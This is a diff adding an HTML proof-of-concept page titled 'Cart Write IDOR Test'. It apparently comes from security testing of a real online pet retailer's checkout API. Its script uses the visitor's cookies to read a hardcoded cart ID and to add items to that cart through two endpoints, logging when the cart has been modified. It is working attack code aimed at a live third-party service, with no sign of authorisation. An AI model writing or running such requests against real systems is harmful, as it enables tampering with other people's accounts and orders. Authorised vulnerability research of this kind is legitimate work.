@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cart Write IDOR Test</title>
+</head>
+<body>
+    <h1>Cart Write IDOR Test</h1>
+    <p>Open DevTools Console to see results</p>
+    
+    <script>
+        const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
+        const OFFER_ID = 2966095;
+        
+        console.log("[*] Testing cart write IDOR...");
+        
+        // Get cart before
+        fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
+            credentials: 'include'
+        })
+        .then(r => r.json())
+        .then(cart => {
+            const beforeCount = cart.articles.length;
+            console.log(`[+] Cart before: ${beforeCount} items`);
+            
+            // Test 1: Add article
+            console.log("[*] Test 1: Adding article...");
+            return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles`, {
+                method: "POST",
+                credentials: "include",
+                headers: {
+                    "Content-Type": "application/json",
+                    "x-requested-with": "XMLHttpRequest"
+                },
+                body: JSON.stringify({
+                    "offerId": OFFER_ID
+                })
+            })
+            .then(r => {
+                console.log(`    HTTP ${r.status}`);
+                return r.text().then(text => {
+                    console.log(`    Response: ${text.substring(0, 500)}`);
+                    return {status: r.status, text: text, beforeCount: beforeCount};
+                });
+            });
+        })
+        .then(result => {
+            if (result.status === 200 || result.status === 201) {
+                console.log("[!!!] SUCCESS! Article added!");
+                
+                // Verify
+                return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
+                    credentials: 'include'
+                })
+                .then(r => r.json())
+                .then(cart => {
+                    console.log(`[+] Cart after: ${cart.articles.length} items`);
+                    if (cart.articles.length > result.beforeCount) {
+                        console.log("[!!!] VERIFIED: Cart modified!");
+                        console.log(`[!!!] Before: ${result.beforeCount}, After: ${cart.articles.length}`);
+                    }
+                });
+            } else {
+                console.log("[!] Add failed, trying /add endpoint...");
+                
+                // Test 2: /add endpoint
+                return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/add`, {
+                    method: "POST",
+                    credentials: "include",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    body: `offerId=${OFFER_ID}&quantity=1`
+                })
+                .then(r => {
+                    console.log(`    HTTP ${r.status}`);
+                    return r.text().then(text => {
+                        console.log(`    Response: ${text.substring(0, 500)}`);
+                        if (r.status === 200 || r.status === 201) {
+                            console.log("[!!!] SUCCESS via /add!");
+                        }
+                    });
+                });
+            }
+        })
+        .catch(e => console.error("Error:", e));
+    </script>
+</body>
+</html>
+
